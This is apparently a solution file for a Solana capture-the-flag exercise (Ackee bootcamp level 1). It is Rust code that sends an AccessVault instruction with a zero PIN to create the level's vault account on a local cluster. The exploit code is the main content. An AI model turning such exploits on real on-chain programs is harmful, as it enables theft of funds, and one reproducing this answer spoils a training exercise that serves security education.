//! Ackee Bootcamp 1 — Ancient Vault.
//!
//! Goal: Make the program create its `ancient_vault` account — the vault
//! PDA (seed `ancient_vault`) existing on chain is the solved state.
//!
//! This level ships prebuilt only upstream: there is no readable program
//! source. Its interface (instructions, accounts, seeds) is defined by
//! the IDL, and the vault is yours to probe once it exists.
//!
//! Upstream starter (`tests/exploit.ts`): a freshly funded keypair —
//! that is the offender identity here — and the vault PDA derivation.
//!
//! Sources:
//! https://github.com/Ackee-Blockchain/Solana-Auditors-Bootcamp/blob/bc0d25cce79b482599a2dde37c3fb112e17e9d0d/Capture-the-Flag/level-1/target/idl/level_1.json
//! https://github.com/Ackee-Blockchain/Solana-Auditors-Bootcamp/blob/bc0d25cce79b482599a2dde37c3fb112e17e9d0d/Capture-the-Flag/level-1/tests/exploit.ts
//! https://github.com/Ackee-Blockchain/Solana-Auditors-Bootcamp/tree/bc0d25cce79b482599a2dde37c3fb112e17e9d0d/Capture-the-Flag/HINTS/level-1
//! (HINTS are the upstream's progressive spoilers — open only if you
//! want them.)

use anchor_client::{
    Client, Cluster, anchor_lang::solana_program::system_program,
};
use ctf::solana::ackee::level_1::*;

pub struct Exploit;

pub async fn attack(
    target: &Target,
    offender: &ctf::solana::SolActor,
) -> eyre::Result<()> {
    // Starter context from the upstream exploit harness:
    // offender is the funded fresh keypair; the vault PDA is
    let ancient_vault = target.vault_pda();

    // Typed program handle — the sol! equivalent for Anchor programs.
    // Level 1's types (instruction args, account structs) are re-exported
    // from this level module via the CPI crate.
    let client = Client::new(Cluster::Localnet, offender.keypair.clone());
    let program = client.program(target.program_id)?;

    program
        .request()
        .accounts(accounts::AccessVault {
            system_program: system_program::ID,
            explorer: offender.pubkey(),
            ancient_vault,
        })
        .args(instruction::AccessVault { _pin: 0 })
        .send()
        .await?;

    Ok(())
}
